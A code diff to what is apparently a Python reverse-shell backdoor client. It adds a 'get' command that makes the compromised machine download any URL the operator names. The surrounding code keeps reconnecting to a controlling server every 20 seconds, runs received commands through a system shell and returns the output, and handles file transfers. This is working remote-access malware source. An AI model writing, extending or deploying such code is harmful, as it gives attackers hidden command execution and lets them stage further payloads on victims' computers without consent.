@@ -6,6 +6,7 @@ import json
 import os
 import sys
 import time
+import requests
 
 def reliable_send(data):
     print("data {}, type {}, compare {}".format(data, type(data), type(data) is not bytes))
@@ -27,6 +28,12 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+
+def downloadFileFromTargetComputer(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as file:
+        file.write(get_response.content)
 
 def connection():
     # ajout d'une tentative de connexion toute les 20 secondes au serveur
@@ -68,6 +75,13 @@ def shell():
                 print("file_data -> {}".format(file_data[1]))
                 print("file_name -> {}".format(file_name))
                 file.write(file_data[1].encode())
+        elif len(command) > 1 and command[:3] == "get":
+            try:
+                downloadFileFromTargetComputer(command[4:])
+                reliable_send("[+] Downloaded File From Specified URL!")
+            except:
+                reliable_send("[-] Faile to Downloade File From Specified URL!")
+
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
